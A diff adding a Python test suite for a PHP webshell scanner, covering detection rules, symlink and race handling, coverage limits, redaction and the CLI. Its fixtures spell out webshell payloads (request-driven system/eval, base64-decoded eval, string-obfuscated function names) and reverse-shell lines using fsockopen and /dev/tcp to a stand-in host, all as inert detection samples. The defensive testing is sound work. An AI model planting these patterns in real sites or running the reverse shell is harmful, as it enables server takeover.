@@ -1,0 +1,288 @@
+"""Inert strings only: the scanner never invokes PHP or a sample's contents."""
+import argparse
+import contextlib
+import io
+import json
+import os
+from pathlib import Path
+import subprocess
+import sys
+import tempfile
+import time
+import unittest
+from unittest.mock import patch
+
+import p2s_harden as p
+
+
+class WebshellIndicators(unittest.TestCase):
+    def indicators(self, text):
+        hits, partial = p.webshell_indicators(text.encode())
+        self.assertIsNone(partial)
+        return hits
+
+    def test_direct_request_execution_and_literal_safe_command(self):
+        for sink in ("system", "exec", "shell_exec", "passthru", "popen", "proc_open", "eval", "assert"):
+            with self.subTest(sink=sink):
+                self.assertEqual(self.indicators("<?php\n" + sink + "($_POST['private-key']);"), {"request-execution": 2})
+                self.assertEqual(self.indicators("<?php " + sink + "('constant');"), {})
+
+    def test_aliases_survive_conditional_blocks_and_reassignment_removes_taint(self):
+        self.assertIn("request-execution", self.indicators("<?php $cmd=$_GET['a']; $cmd=trim($cmd); if($ok){system($cmd);}"))
+        self.assertIn("request-execution", self.indicators('<?php $cmd=$_GET["a"]; system("$cmd");'))
+        self.assertEqual(self.indicators("<?php $cmd=$_GET['a']; $cmd='date'; system($cmd);"), {})
+        self.assertEqual(self.indicators("<?php $cmd=$_GET['a']; function f(){system($cmd);}"), {})
+
+    def test_decoders_are_combined_with_code_execution(self):
+        for decoder in p._WS_DECODERS:
+            self.assertIn("encoded-execution", self.indicators("<?php eval(" + decoder + "('opaque'));"))
+            self.assertEqual(self.indicators("<?php $value=" + decoder + "('opaque'); echo $value;"), {})
+        self.assertIn('encoded-execution', self.indicators("<?php $decoder='base64_decode'; $code=$decoder('opaque'); eval($code);"))
+        self.assertEqual(self.indicators("<?php $code=base64_decode('opaque'); $code='constant'; eval($code);"), {})
+
+    def test_request_body_include_dynamic_callable_and_interpolation(self):
+        for code in ("include $_GET['path'];", "require_once($_COOKIE['path']);"):
+            self.assertIn("request-include", self.indicators("<?php " + code))
+        for code in ("$fn=$_POST['name']; $fn();", "$_GET['name']($_POST['arg']);"):
+            self.assertIn("request-callable", self.indicators("<?php " + code))
+        for code in ("eval(file_get_contents('php://input'));", "system(filter_input(INPUT_POST,'arg'));", "`echo {$_GET['a']}`;"):
+            self.assertIn("request-execution", self.indicators("<?php " + code))
+        self.assertIn("request-execution", self.indicators(r'<?php $fn="sys\x74em"; $fn($_GET["x"]);'))
+        self.assertIn("request-execution", self.indicators("<?php $fn='sys'.'tem'; $fn($_GET['x']);"))
+        self.assertIn('request-callable', self.indicators("<?php call_user_func($_POST['f'], $_POST['x']);"))
+        self.assertEqual(self.indicators("<?php array_map('htmlspecialchars', $_POST['x']);"), {})
+
+    def test_network_and_shell_combination_requires_both_indicators(self):
+        self.assertIn('network-shell', self.indicators("<?php $s=fsockopen('private.test',1234); proc_open('/bin/sh -i', $fds, $pipes);"))
+        self.assertIn('network-shell', self.indicators("<?php exec('/bin/bash -c /dev/tcp/private.test/1234');"))
+        for text in ("<?php fsockopen('example.test',443);", "<?php proc_open('/bin/sh -c date', $fds, $pipes);", "<?php fsockopen('example.test',443); exec('sendmail');"):
+            self.assertEqual(self.indicators(text), {})
+
+    def test_comments_strings_methods_and_non_php_content_are_inert(self):
+        for text in (
+            "plain system($_POST['a']);",
+            "<?php /* eval(base64_decode($_POST['a'])); */ echo 'ok';",
+            "<?php // system($_GET['a']);\n echo 'ok';",
+            "<?php # eval($_POST['a']);\n echo 'ok';",
+            "<?php $example='eval(base64_decode($_POST[a]));';",
+            '<?php $example="eval(base64_decode($_POST[a]));";',
+            "<?php $object->system($_GET['a']); ClassName::eval($_GET['b']);",
+            "<?php $cmd='file_get_contents'.'php://input'; system($cmd);",
+            "<?php $example=<<<'SAMPLE'\neval($_POST['a']);\nSAMPLE;\necho $example;",
+            "<?php $example=<<<SAMPLE\neval($_POST['a']);\nSAMPLE;\necho $example;",
+        ):
+            with self.subTest(text=text):
+                self.assertEqual(self.indicators(text), {})
+
+    def test_php_blocks_short_echo_comments_closing_tag_and_non_utf8(self):
+        for text in ("html <?=system($_GET['x'])?> footer", "<? system($_GET['x']); ?>", "<?php // comment ?> html <?php eval($_GET['x']);"):
+            self.assertIn("request-execution", self.indicators(text))
+        self.assertIn("request-execution", p.webshell_indicators(b"\xff\x00<?php eval($_POST['x']);")[0])
+        self.assertEqual(self.indicators("<?xml version='1.0'?> system($_GET['x'])"), {})
+
+    def test_duplicate_indicators_keep_first_line_without_source_excerpts(self):
+        self.assertEqual(self.indicators("<?php\neval($_GET['secret']);\neval($_POST['secret']);"), {"request-execution": 2})
+
+    def test_token_expression_and_time_limits_are_explicit(self):
+        self.assertEqual(p.webshell_indicators(b"<?php eval($_GET['x']);", time.monotonic() - 1)[1], "time")
+        self.assertEqual(p.webshell_indicators(b"<?php " + b"+ " * 100001, time.monotonic() + 30)[1], "tokens")
+        self.assertEqual(p.webshell_indicators(b"<?php eval(" + b"(" * 130 + b"0" + b")" * 130 + b");")[1], "expression")
+        self.assertEqual(p.webshell_indicators(b"<?php eval(" + b"0+" * 300 + b"0);")[1], "expression")
+
+
+@unittest.skipUnless(sys.platform == "linux", "Linux no-follow descriptor traversal")
+class WebshellFilesystem(unittest.TestCase):
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory(prefix="p2s-webshell-")
+        self.root = Path(self.tmp.name)
+        self.args = argparse.Namespace(roots=[str(self.root)], discovery={}, progress=False, no_progress=True,
+            max_paths=250000, walk_seconds=10, scan_file_bytes=2097152, scan_total_bytes=134217728)
+
+    def tearDown(self):
+        self.tmp.cleanup()
+
+    def scan(self):
+        return p.scan_webshells(self.args)
+
+    def test_hidden_upload_vendor_and_unusual_extension_are_scanned_without_mutation(self):
+        for name in ("uploads/avatar.jpg", "vendor/.hidden/payload", "cache/a.phtml"):
+            file = self.root / name
+            file.parent.mkdir(parents=True, exist_ok=True)
+            file.write_bytes(b"<?php\nsystem($_POST['DO_NOT_LEAK']);")
+        before = {str(f): (f.read_bytes(), f.stat().st_mtime_ns, f.stat().st_mode) for f in self.root.rglob('*') if f.is_file()}
+        with patch.object(p, "command", side_effect=AssertionError("No external program is needed")):
+            report = self.scan()
+        self.assertEqual(report.exit_code(), 1)
+        self.assertEqual(len([row for row in report.rows if row['status'] == 'OPEN']), 3)
+        self.assertEqual(before, {name: (Path(name).read_bytes(), Path(name).stat().st_mtime_ns, Path(name).stat().st_mode) for name in before})
+        for row in report.rows[:-1]:
+            self.assertRegex(row['sha256'], r'^[a-f0-9]{64}$')
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            report.show(True)
+        self.assertNotIn("DO_NOT_LEAK", out.getvalue())
+
+    def test_empty_and_benign_scans_are_info_without_clean_certification(self):
+        for sample in (None, b"<?php echo htmlspecialchars($_GET['text']);"):
+            if sample:
+                (self.root / 'index.php').write_bytes(sample)
+            report = self.scan()
+            self.assertEqual(report.exit_code(), 0)
+            self.assertEqual([row['status'] for row in report.rows], ['INFO'])
+            self.assertIn("does not establish a clean server", report.rows[0]['detail'])
+
+    def test_startup_references_do_not_disclose_targets_and_empty_values_are_inert(self):
+        (self.root / '.user.ini').write_text("; auto_prepend_file=ignore\nauto_prepend_file=/PRIVATE/TARGET\n")
+        (self.root / '.htaccess').write_text('php_value auto_append_file "/PRIVATE/TARGET"\n')
+        (self.root / 'php.ini').write_text('auto_prepend_file=""\nauto_append_file=none\n')
+        report = self.scan()
+        findings = [r for r in report.rows if r['status'] == 'OPEN']
+        self.assertEqual(len(findings), 2)
+        self.assertEqual({r['rule_id'] for r in findings}, {'P2S-WS002'})
+        self.assertNotIn('/PRIVATE/TARGET', json.dumps(report.rows))
+
+    def test_skipped_symlinks_devices_and_missing_paths_are_unknown(self):
+        (self.root / 'link').symlink_to('/etc/passwd')
+        os.mkfifo(str(self.root / 'pipe'))
+        report = self.scan()
+        self.assertEqual(report.exit_code(), 2)
+        self.assertEqual(set(report.rows[-1]['evidence']['coverage_reasons']), {'symlink', 'special'})
+        self.args.roots = [str(self.root / 'absent')]
+        self.assertEqual(self.scan().exit_code(), 2)
+        self.args.roots = [str(self.root / 'link')]
+        self.assertEqual(self.scan().exit_code(), 2)
+
+    def test_directory_ancestor_symlink_is_not_followed(self):
+        real = self.root / 'real'
+        real.mkdir()
+        (real / 'sub').mkdir()
+        (self.root / 'alias').symlink_to(real, target_is_directory=True)
+        self.args.roots = [str(self.root / 'alias/sub')]
+        report = self.scan()
+        self.assertEqual(report.exit_code(), 2)
+        self.assertEqual(report.rows[-1]['evidence']['examined_files'], 0)
+
+    def test_replacement_with_symlink_cannot_read_an_out_of_scope_target(self):
+        file = self.root / 'race.php'
+        file.write_text('benign')
+        original = p.os.open
+        replaced = []
+        def open_file(path, flags, *args, **kwargs):
+            if path == 'race.php' and not replaced:
+                replaced.append(True)
+                file.unlink()
+                file.symlink_to('/etc/passwd')
+            return original(path, flags, *args, **kwargs)
+        with patch.object(p.os, 'open', side_effect=open_file):
+            report = self.scan()
+        self.assertEqual(report.exit_code(), 2)
+        self.assertEqual(report.rows[-1]['evidence']['examined_files'], 0)
+
+    def test_permission_failure_continues_to_independent_files(self):
+        (self.root / 'denied.php').write_text('benign')
+        (self.root / 'found.php').write_text("<?php eval($_GET['x']);")
+        original = p.os.open
+        def open_file(path, flags, *args, **kwargs):
+            if path == 'denied.php':
+                raise PermissionError('PRIVATE_DIAGNOSTIC')
+            return original(path, flags, *args, **kwargs)
+        with patch.object(p.os, 'open', side_effect=open_file):
+            report = self.scan()
+        self.assertTrue(report.has('OPEN'))
+        self.assertTrue(report.has('UNKNOWN'))
+        self.assertNotIn('PRIVATE_DIAGNOSTIC', json.dumps(report.rows))
+
+    def test_depth_and_finding_limits_are_explicit(self):
+        directory = self.root
+        for _ in range(65):
+            directory = directory / 'd'
+            directory.mkdir()
+        self.assertIn('depth', self.scan().rows[-1]['evidence']['coverage_reasons'])
+        for number in range(201):
+            (self.root / ('payload-' + str(number))).write_text("<?php eval($_POST['x']);")
+        report = self.scan()
+        self.assertEqual(len([row for row in report.rows if row['status'] == 'OPEN']), 200)
+        self.assertIn('findings', report.rows[-1]['evidence']['coverage_reasons'])
+        output = io.StringIO()
+        with contextlib.redirect_stdout(output):
+            report.show()
+        self.assertLess(output.getvalue().index('Webshell scan coverage'), output.getvalue().index('PHP file indicator'))
+        self.assertNotIn('Discovered: 0 host FPM', output.getvalue())
+
+    def test_limits_remain_unknown_and_findings_survive_incomplete_coverage(self):
+        (self.root / 'small.php').write_text("<?php eval($_GET['x']);")
+        (self.root / 'large.bin').write_bytes(b'x' * 2048)
+        self.args.scan_file_bytes = 1024
+        report = self.scan()
+        self.assertEqual(report.exit_code(), 2)
+        self.assertTrue(report.has('OPEN'))
+        self.assertIn('file-size', report.rows[-1]['evidence']['coverage_reasons'])
+        report.configure('open')
+        self.assertEqual(report.exit_code(), 1)
+        self.args.scan_total_bytes = 10
+        self.assertIn('total-bytes', self.scan().rows[-1]['evidence']['coverage_reasons'])
+        self.args.max_paths = 1
+        self.args.scan_total_bytes = 134217728
+        self.assertIn('entries', self.scan().rows[-1]['evidence']['coverage_reasons'])
+
+    def test_changed_file_is_not_reported_as_fully_examined(self):
+        file = self.root / 'race.php'
+        file.write_text("<?php eval($_GET['x']);")
+        original = p.os.read
+        changed = []
+        def read(fd, count):
+            result = original(fd, count)
+            if result and not changed:
+                changed.append(True)
+                file.write_text("changed during read")
+            return result
+        with patch.object(p.os, 'read', side_effect=read):
+            report = self.scan()
+        self.assertEqual(report.exit_code(), 2)
+        self.assertIn('changed', report.rows[-1]['evidence']['coverage_reasons'])
+
+    def test_redaction_has_useful_facts_but_no_path_source_hash_or_original_id(self):
+        file = self.root / 'PRIVATE_HOST.php'
+        file.write_text("<?php\neval(base64_decode($_POST['PRIVATE_SECRET']));")
+        report = self.scan()
+        for as_json in (True, False):
+            output = io.StringIO()
+            with contextlib.redirect_stdout(output):
+                report.show(as_json, lang='de', redact=True)
+            text = output.getvalue()
+            for private in ('PRIVATE_HOST', 'PRIVATE_SECRET', str(self.root), report.rows[0]['id'], report.rows[0]['sha256']):
+                self.assertNotIn(private, text)
+            self.assertIn('encoded-execution' if as_json else 'Decoder-Ausgabe', text)
+        self.assertEqual(p.safe_evidence('P2S-WS001', dict(indicators=['PRIVATE_SECRET'], line='secret', sha256='secret')), {})
+
+    def test_real_cli_without_fpm_runs_read_only_and_json_contract_is_preserved(self):
+        (self.root / 'index.php').write_text("<?php system($_GET['x']);")
+        result = subprocess.run([sys.executable, '-B', str(Path(p.__file__)), '--scan-webshells', '--root', str(self.root), '--json'], capture_output=True, text=True)
+        self.assertEqual(result.returncode, 1, result.stderr)
+        data = json.loads(result.stdout)
+        self.assertTrue(data['has_open'])
+        self.assertFalse(data['has_unknown'])
+        self.assertIsNone(data['plan'])
+        self.assertIsNone(data['transaction'])
+        self.assertEqual(set(r['rule_id'] for r in data['findings']), {'P2S-WS001', 'P2S-WS003'})
+
+    def test_bash_ssh_transport_runs_the_mode_with_quoted_root_and_exact_exit(self):
+        root = self.root / "a space and 'quote"
+        root.mkdir()
+        (root / 'index.php').write_text("<?php eval($_POST['x']);")
+        ssh = self.root / 'fake-ssh'
+        ssh.write_text('#!/bin/bash\nfor argument; do last="$argument"; done\nexec /bin/sh -c "$last"\n')
+        ssh.chmod(0o700)
+        result = subprocess.run(['/bin/bash', str(Path(p.__file__).with_name('p2s-harden.sh')), '--ssh', 'inert.test',
+            '--scan-webshells', '--root', str(root), '--scan-file-bytes', '4096', '--scan-total-bytes', '8192', '--redact', '--json'],
+            env=dict(os.environ, SSH_BIN=str(ssh)), capture_output=True, text=True)
+        self.assertEqual(result.returncode, 1, result.stderr)
+        data = json.loads(result.stdout)
+        self.assertTrue(data['redacted'])
+        self.assertTrue(data['has_open'])
+        self.assertFalse(data['has_unknown'])
+        self.assertNotIn(str(root), result.stdout)
+
+
+if __name__ == '__main__':
+    unittest.main()
